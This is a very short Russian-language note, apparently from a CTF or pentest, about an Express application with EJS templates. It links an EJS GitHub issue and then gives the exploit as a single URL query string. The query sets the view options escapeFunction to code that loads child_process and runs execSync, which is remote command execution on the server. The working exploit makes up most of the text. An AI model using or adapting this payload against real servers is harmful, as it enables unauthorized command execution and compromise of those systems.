# Мы имеем приложение на express с ejs, и там оказалась рабочая ekf vulnerability
```
https://github.com/mde/ejs/issues/735
```
## Вот сплойт
```
/?blob=John&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20global.process.mainModule.constructor._load('child_process').execSync('ls');
```